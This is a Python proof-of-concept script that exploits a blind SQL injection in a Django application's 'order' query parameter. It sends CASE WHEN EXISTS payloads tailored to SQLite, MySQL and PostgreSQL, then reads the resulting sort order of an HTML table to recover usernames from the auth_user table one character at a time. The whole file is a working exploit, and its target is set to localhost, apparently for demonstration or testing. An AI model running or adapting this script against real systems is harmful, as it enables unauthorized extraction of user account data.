import requests, string, argparse
from bs4 import BeautifulSoup

BASE_URL = 'http://localhost:8000/articles/?order='

# If a given username exists in the auth_user table, sort results by author (ascending). 
# Otherwise, sort by article's title (ascending).
SQL_QUERY = 'articles_article.id=0),(case when exists(select 1 from auth_user u where u.username like \'{username}%%\') then author else title end) asc; -- '
PAYLOAD = {
    'sqlite': '"."),(case when exists(select 1 from auth_user u where u.username like \'{username}%\' escape \'\\\') then author else title end) asc; -- ',
    'mysql': SQL_QUERY,
    'postgresql': SQL_QUERY,
}

# Expected output if table is sorted by author's name (ascending).
EXPECTED_OUTCOME = ['Anakin Skywalker', 'Sun Tzu Dev', 'Zed']

def username_alphabet():
    '''
    Generator function that iterates over characters allowed in Django usernames:
    https://docs.djangoproject.com/en/3.2/ref/contrib/auth/#django.contrib.auth.models.User.username
    '''
    alphabet = string.ascii_lowercase + string.digits + '_@+.-'
    for char in alphabet:
        # The underscore (_) is a wildcard character for the LIKE clause, so it has to be escaped.
        if char == '_':
            char = '\\_'
        yield char

def extract_column_values(html_doc, col_idx):
    '''
    Extracts column's (identified by col_idx) values from the HTML table.
    '''
    data = []

    bs = BeautifulSoup(html_doc, 'html.parser')
    table_body = bs.find('tbody')
    rows = table_body.find_all('tr')
    for row in rows:
        data.append(row.find_all('td')[col_idx].text)

    return data

def phrase_found_in_users_table(phrase, db):
    response = requests.get(BASE_URL + PAYLOAD[db].format(username=phrase))
    # 'Author' column has idx = 1.
    return extract_column_values(response.text, 1) == EXPECTED_OUTCOME

def search_for_username(phrase, db):
    if phrase_found_in_users_table(phrase, db):
        username = phrase
        for char in username_alphabet():
            result = search_for_username(username + char, db)
            if result:
                username = result
        return username
    else:
        return None
        
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    db_choices = ['sqlite', 'mysql', 'postgresql']
    parser.add_argument(
        'db', 
        metavar='DB_SERVER_TYPE', 
        choices=db_choices,
        help='Allowed values: ' + '|'.join(db_choices)
    )
    args = parser.parse_args()

    print('[*] Searching for usernames...')
    for char in username_alphabet():
        username = search_for_username(char, args.db)
        if username:
            print(username.replace('\_', '_'))